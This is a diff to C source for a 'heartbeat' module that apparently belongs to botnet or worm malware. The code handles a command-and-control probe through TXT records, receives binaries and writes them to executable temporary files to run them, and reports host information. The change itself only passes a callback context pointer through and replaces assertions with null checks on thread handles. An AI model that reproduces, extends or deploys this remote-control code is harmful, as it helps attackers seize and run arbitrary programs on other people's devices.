@@ -57,6 +57,7 @@ typedef struct {
 		prne_htbt_status_code_t *status,
 		int32_t *err);
 	const prne_htbt_cbset_t *cbset;
+	void *cb_ctx;
 	size_t skip;
 	prne_iobuf_t iobuf[2];
 	prne_pth_cv_t cv;
@@ -954,7 +955,7 @@ static void htbt_slv_srv_hostinfo (
 
 	prne_htbt_init_host_info(&hi);
 
-	if (ctx->cbset->hostinfo(&hi)) {
+	if (ctx->cbset->hostinfo(ctx->cb_ctx, &hi)) {
 		htbt_slv_fab_frame(
 			ctx,
 			mh,
@@ -1077,6 +1078,7 @@ static bool htbt_slv_srv_bin (
 
 	errno = 0;
 	path = ctx->cbset->tmpfile(
+		ctx->cb_ctx,
 		bin_meta.bin_size,
 		mh->op == PRNE_HTBT_OP_RUN_BIN ? 0700 : 0600);
 	if (path == NULL) {
@@ -1164,7 +1166,7 @@ static bool htbt_slv_srv_bin (
 			&ret_errno);
 	}
 	else {
-		if (!ctx->cbset->ny_bin(path, &bin_meta.cmd)) {
+		if (!ctx->cbset->ny_bin(ctx->cb_ctx, path, &bin_meta.cmd)) {
 			ret_status = PRNE_HTBT_STATUS_ERRNO;
 			ret_errno = errno;
 			goto SND_STATUS;
@@ -1662,6 +1664,7 @@ static void htbt_main_srv_hover (
 	c.slv.write_f = htbt_main_slv_write_f;
 	c.slv.hover_f = htbt_main_slv_hover_f;
 	c.slv.cbset = &ctx->param.cb_f;
+	c.slv.cb_ctx = ctx->param.cb_ctx;
 	c.slv.cv.lock = &ctx->lock;
 	c.slv.cv.cond = &ctx->cond;
 	mbedtls_ssl_init(&c.ssl);
@@ -1707,8 +1710,12 @@ static void *htbt_main_entry (void *p) {
 	HTBT_INTP_CTX(p);
 	htbt_req_slip_t *slip = NULL;
 
-	prne_assert(pth_resume(ctx->lbd.pth));
-	prne_assert(pth_resume(ctx->cncp.pth));
+	if (ctx->lbd.pth != NULL) {
+		pth_resume(ctx->lbd.pth);
+	}
+	if (ctx->cncp.pth != NULL) {
+		pth_resume(ctx->cncp.pth);
+	}
 
 	while (ctx->loop_flag) {
 		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
@@ -1744,10 +1751,14 @@ FREE:
 		}
 	}
 
-	prne_assert(pth_join(ctx->lbd.pth, NULL));
-	prne_assert(pth_join(ctx->cncp.pth, NULL));
-	ctx->lbd.pth = NULL;
-	ctx->cncp.pth = NULL;
+	if (ctx->lbd.pth != NULL) {
+		pth_join(ctx->lbd.pth, NULL);
+		ctx->lbd.pth = NULL;
+	}
+	if (ctx->cncp.pth != NULL) {
+		pth_join(ctx->cncp.pth, NULL);
+		ctx->cncp.pth = NULL;
+	}
 
 	htbt_main_empty_req_q(ctx);
 	prne_llist_clear(&ctx->main.hover_req);
@@ -1861,6 +1872,7 @@ static void htbt_cncp_stream_slv (
 	c.slv.write_f = htbt_cncp_slv_write_f;
 	c.slv.hover_f = htbt_cncp_slv_hover_f;
 	c.slv.cbset = &ctx->param.cb_f;
+	c.slv.cb_ctx = ctx->param.cb_ctx;
 	if (!htbt_alloc_slv_iobuf(&c.slv)) {
 		prne_dbgperr("htbt_alloc_slv_iobuf()@CNCP");
 		goto END;
@@ -1973,7 +1985,7 @@ static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
 	cv.cond = &ctx->cncp.cond;
 	cv.broadcast = false;
 
-	if (!ctx->param.cb_f.cnc_txtrec(ctx->cncp.txtrec)) {
+	if (!ctx->param.cb_f.cnc_txtrec(ctx->param.cb_ctx, ctx->cncp.txtrec)) {
 		goto END;
 	}
 	ctx->cncp.txtrec[255] = 0;
@@ -2171,6 +2183,7 @@ static bool htbt_alloc_lbd_client (
 	c->slv.write_f = htbt_lbd_slv_write_f;
 	c->slv.hover_f = htbt_lbd_slv_hover_f;
 	c->slv.cbset = &parent->param.cb_f;
+	c->slv.cb_ctx = parent->param.cb_ctx;
 	c->slv.cv.lock = &parent->lock;
 	c->slv.cv.cond = &parent->cond;
 
@@ -2483,11 +2496,9 @@ prne_htbt_t *prne_alloc_htbt (
 	pth_mutex_init(&ret->main.lock);
 	pth_cond_init(&ret->main.cond);
 
-	ret->cncp.pth = NULL;
 	pth_mutex_init(&ret->cncp.lock);
 	pth_cond_init(&ret->cncp.cond);
 
-	ret->lbd.pth = NULL;
 	prne_init_llist(&ret->lbd.conn_list);
 	ret->lbd.fd = -1;
 
